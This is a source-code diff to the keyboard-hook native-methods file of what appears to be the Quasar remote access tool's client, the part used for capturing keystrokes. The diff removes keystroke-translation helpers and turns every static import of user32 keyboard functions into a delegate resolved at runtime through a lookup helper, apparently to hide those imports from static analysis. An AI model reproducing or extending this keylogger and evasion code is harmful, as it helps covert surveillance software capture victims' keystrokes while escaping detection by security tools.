@@ -7,173 +7,19 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
 using Quasar.Client.MouseKeyHook.Implementation;
+using Quasar.Client.Utilities;
 
 namespace Quasar.Client.MouseKeyHook.WinApi
 {
-    internal static class KeyboardNativeMethods
+    internal static partial class KeyboardNativeMethods
     {
-        //values from Winuser.h in Microsoft SDK.
-        public const byte VK_SHIFT = 0x10;
-
-        public const byte VK_CAPITAL = 0x14;
-        public const byte VK_NUMLOCK = 0x90;
-        public const byte VK_LSHIFT = 0xA0;
-        public const byte VK_RSHIFT = 0xA1;
-        public const byte VK_LCONTROL = 0xA2;
-        public const byte VK_RCONTROL = 0xA3;
-        public const byte VK_LMENU = 0xA4;
-        public const byte VK_RMENU = 0xA5;
-        public const byte VK_LWIN = 0x5B;
-        public const byte VK_RWIN = 0x5C;
-        public const byte VK_SCROLL = 0x91;
-
-        public const byte VK_INSERT = 0x2D;
-
-        //may be possible to use these aggregates instead of L and R separately (untested)
-        public const byte VK_CONTROL = 0x11;
-
-        public const byte VK_MENU = 0x12;
-
-        public const byte VK_PACKET = 0xE7;
-
-        //Used to pass Unicode characters as if they were keystrokes. The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods
-        private static int lastVirtualKeyCode;
-
-        private static int lastScanCode;
-        private static byte[] lastKeyState = new byte[255];
-        private static bool lastIsDead;
-
-        /// <summary>
-        ///     Translates a virtual key to its character equivalent using the current keyboard layout without knowing the
-        ///     scancode in advance.
-        /// </summary>
-        /// <param name="virtualKeyCode"></param>
-        /// <param name="fuState"></param>
-        /// <param name="chars"></param>
-        /// <returns></returns>
-        internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int fuState, out char[] chars)
-        {
-            var dwhkl = GetActiveKeyboard();
-            var scanCode = MapVirtualKeyEx(virtualKeyCode, (int)MapType.MAPVK_VK_TO_VSC, dwhkl);
-            TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
-        }
-
-        /// <summary>
-        ///     Translates a virtual key to its character equivalent using the current keyboard layout
-        /// </summary>
-        /// <param name="virtualKeyCode"></param>
-        /// <param name="scanCode"></param>
-        /// <param name="fuState"></param>
-        /// <param name="chars"></param>
-        /// <returns></returns>
-        internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState,
-            out char[] chars)
-        {
-            var dwhkl = GetActiveKeyboard(); //get the active keyboard layout
-            TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
-        }
-
-        /// <summary>
-        ///     Translates a virtual key to its character equivalent using a specified keyboard layout
-        /// </summary>
-        /// <param name="virtualKeyCode"></param>
-        /// <param name="scanCode"></param>
-        /// <param name="fuState"></param>
-        /// <param name="dwhkl"></param>
-        /// <param name="chars"></param>
-        /// <returns></returns>
-        internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, IntPtr dwhkl,
-            out char[] chars)
-        {
-            var pwszBuff = new StringBuilder(64);
-            var keyboardState = KeyboardState.GetCurrent();
-            var currentKeyboardState = keyboardState.GetNativeState();
-            var isDead = false;
-
-            if (keyboardState.IsDown(Keys.ShiftKey))
-                currentKeyboardState[(byte)Keys.ShiftKey] = 0x80;
-
-            if (keyboardState.IsToggled(Keys.CapsLock))
-                currentKeyboardState[(byte)Keys.CapsLock] = 0x01;
-
-            var relevantChars = ToUnicodeEx(virtualKeyCode, scanCode, currentKeyboardState, pwszBuff, pwszBuff.Capacity,
-                fuState, dwhkl);
-
-            switch (relevantChars)
-            {
-                case -1:
-                    isDead = true;
-                    ClearKeyboardBuffer(virtualKeyCode, scanCode, dwhkl);
-                    chars = null;
-                    break;
-
-                case 0:
-                    chars = null;
-                    break;
-
-                case 1:
-                    if (pwszBuff.Length > 0)
-                        chars = new[] { pwszBuff[0] };
-                    else
-                        chars = null;
-                    break;
-
-                // Two or more (only two of them is relevant)
-                default:
-                    if (pwszBuff.Length > 1)
-                        chars = new[] { pwszBuff[0], pwszBuff[1] };
-                    else
-                        chars = new[] { pwszBuff[0] };
-                    break;
-            }
-
-            if (lastVirtualKeyCode != 0 && lastIsDead)
-            {
-                if (chars != null)
-                {
-                    var sbTemp = new StringBuilder(5);
-                    ToUnicodeEx(lastVirtualKeyCode, lastScanCode, lastKeyState, sbTemp, sbTemp.Capacity, 0, dwhkl);
-                    lastIsDead = false;
-                    lastVirtualKeyCode = 0;
-                }
-
-                return;
-            }
-
-            lastScanCode = scanCode;
-            lastVirtualKeyCode = virtualKeyCode;
-            lastIsDead = isDead;
-            lastKeyState = (byte[])currentKeyboardState.Clone();
-        }
-
-
-        private static void ClearKeyboardBuffer(int vk, int sc, IntPtr hkl)
-        {
-            var sb = new StringBuilder(10);
-
-            int rc;
-            do
-            {
-                var lpKeyStateNull = new byte[255];
-                rc = ToUnicodeEx(vk, sc, lpKeyStateNull, sb, sb.Capacity, 0, hkl);
-            } while (rc < 0);
-        }
-
-        /// <summary>
-        ///     Gets the input locale identifier for the active application's thread.  Using this combined with the ToUnicodeEx and
-        ///     MapVirtualKeyEx enables Windows to properly translate keys based on the keyboard layout designated for the
-        ///     application.
-        /// </summary>
-        /// <returns>HKL</returns>
-        private static IntPtr GetActiveKeyboard()
-        {
-            var hActiveWnd = ThreadNativeMethods.GetForegroundWindow(); //handle to focused window
-            int dwProcessId;
-            var hCurrentWnd = ThreadNativeMethods.GetWindowThreadProcessId(hActiveWnd, out dwProcessId);
-            //thread of focused window
-            return GetKeyboardLayout(hCurrentWnd); //get the layout identifier for the thread whose window is focused
-        }
-
+        //[DllImport("user32.dll")]
+        public delegate int ToAsciiProc(
+            int uVirtKey,
+            int uScanCode,
+            byte[] lpbKeyState,
+            byte[] lpwTransKey,
+            int fuState);
         /// <summary>
         ///     The ToAscii function translates the specified virtual-key code and keyboard
         ///     state to the corresponding character or characters. The function translates the code
@@ -213,14 +59,22 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         ///     http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winui/winui/windowsuserinterface/userinput/keyboardinput/keyboardinputreference/keyboardinputfunctions/toascii.asp
         /// </remarks>
         [Obsolete("Use ToUnicodeEx instead")]
-        [DllImport("user32.dll")]
-        public static extern int ToAscii(
+        public static int ToAscii(
             int uVirtKey,
             int uScanCode,
             byte[] lpbKeyState,
             byte[] lpwTransKey,
-            int fuState);
+            int fuState) => ClientNatives.Lookup<ToAsciiProc>("user32.dll", "ToAscii")(uVirtKey, uScanCode, lpbKeyState, lpwTransKey, fuState);
 
+        public delegate int ToUnicodeExProc(
+        int wVirtKey,
+            int wScanCode,
+            byte[] lpKeyState,
+            [Out][MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder pwszBuff,
+            int cchBuff,
+            int wFlags,
+            IntPtr dwhkl);
+        //[DllImport("user32.dll")]
         /// <summary>
         ///     Translates the specified virtual-key code and keyboard state to the corresponding Unicode character or characters.
         /// </summary>
@@ -268,14 +122,14 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         ///         </item>
         ///     </list>
         /// </returns>
-        [DllImport("user32.dll")]
-        public static extern int ToUnicodeEx(int wVirtKey,
+        public static int ToUnicodeEx(
+        int wVirtKey,
             int wScanCode,
             byte[] lpKeyState,
             [Out][MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder pwszBuff,
             int cchBuff,
             int wFlags,
-            IntPtr dwhkl);
+            IntPtr dwhkl) => ClientNatives.Lookup<ToUnicodeExProc>("user32.dll", "ToUnicodeEx")(wVirtKey, wScanCode, lpKeyState, pwszBuff, cchBuff, wFlags, dwhkl);
 
         /// <summary>
         ///     The GetKeyboardState function copies the status of the 256 virtual keys to the
@@ -291,8 +145,11 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         /// <remarks>
         ///     http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winui/winui/windowsuserinterface/userinput/keyboardinput/keyboardinputreference/keyboardinputfunctions/toascii.asp
         /// </remarks>
-        [DllImport("user32.dll")]
-        public static extern int GetKeyboardState(byte[] pbKeyState);
+        public delegate int GetKeyboardStateProc(byte[] pbKeyState);
+        //[DllImport("user32.dll")]
+        public static int GetKeyboardState(byte[] pbKeyState) => ClientNatives.Lookup<GetKeyboardStateProc>("user32.dll", "GetKeyboardState")(pbKeyState);
+
+        public delegate short GetKeyStateProc(int vKey);
 
         /// <summary>
         ///     The GetKeyState function retrieves the status of the specified virtual key. The status specifies whether the key is
@@ -312,9 +169,10 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         ///     on when the key is toggled, and off when the key is untoggled.
         /// </returns>
         /// <remarks>http://msdn.microsoft.com/en-us/library/ms646301.aspx</remarks>
-        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
-        public static extern short GetKeyState(int vKey);
+        //[DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        public static short GetKeyState(int vKey) => ClientNatives.Lookup<GetKeyStateProc>("user32.dll", "GetKeyState")(vKey);
 
+        internal delegate int MapVirtualKeyExProc(int uCode, int uMapType, IntPtr dwhkl);
         /// <summary>
         ///     Translates (maps) a virtual-key code into a scan code or character value, or translates a scan code into a
         ///     virtual-key code.
@@ -329,9 +187,10 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         /// </param>
         /// <param name="dwhkl">[in] The input locale identifier used to translate the specified code.</param>
         /// <returns></returns>
-        [DllImport("user32.dll", CharSet = CharSet.Auto)]
-        internal static extern int MapVirtualKeyEx(int uCode, int uMapType, IntPtr dwhkl);
+        //[DllImport("user32.dll", CharSet = CharSet.Auto)]
+        internal static int MapVirtualKeyEx(int uCode, int uMapType, IntPtr dwhkl) => ClientNatives.Lookup<MapVirtualKeyExProc>("user32.dll", "MapVirtualKeyExW")(uCode, uMapType, dwhkl);
 
+        internal delegate IntPtr GetKeyboardLayoutProc(int dwLayout);
         /// <summary>
         ///     Retrieves the active input locale identifier (formerly called the keyboard layout) for the specified thread.
         ///     If the idThread parameter is zero, the input locale identifier for the active thread is returned.
@@ -342,39 +201,7 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         ///     input
         ///     language and the high word contains a device handle to the physical layout of the keyboard.
         /// </returns>
-        [DllImport("user32.dll", CharSet = CharSet.Auto)]
-        internal static extern IntPtr GetKeyboardLayout(int dwLayout);
-
-        /// <summary>
-        ///     MapVirtualKeys uMapType
-        /// </summary>
-        internal enum MapType
-        {
-            /// <summary>
-            ///     uCode is a virtual-key code and is translated into an unshifted character value in the low-order word of the return
-            ///     value. Dead keys (diacritics) are indicated by setting the top bit of the return value. If there is no translation,
-            ///     the function returns 0.
-            /// </summary>
-            MAPVK_VK_TO_VSC,
-
-            /// <summary>
-            ///     uCode is a virtual-key code and is translated into a scan code. If it is a virtual-key code that does not
-            ///     distinguish between left- and right-hand keys, the left-hand scan code is returned. If there is no translation, the
-            ///     function returns 0.
-            /// </summary>
-            MAPVK_VSC_TO_VK,
-
-            /// <summary>
-            ///     uCode is a scan code and is translated into a virtual-key code that does not distinguish between left- and
-            ///     right-hand keys. If there is no translation, the function returns 0.
-            /// </summary>
-            MAPVK_VK_TO_CHAR,
-
-            /// <summary>
-            ///     uCode is a scan code and is translated into a virtual-key code that distinguishes between left- and right-hand
-            ///     keys. If there is no translation, the function returns 0.
-            /// </summary>
-            MAPVK_VSC_TO_VK_EX
-        }
+        //[DllImport("user32.dll", CharSet = CharSet.Auto)]
+        internal static IntPtr GetKeyboardLayout(int dwLayout) => ClientNatives.Lookup<GetKeyboardLayoutProc>("user32.dll", "GetKeyboardLayout")(dwLayout);
     }
 }
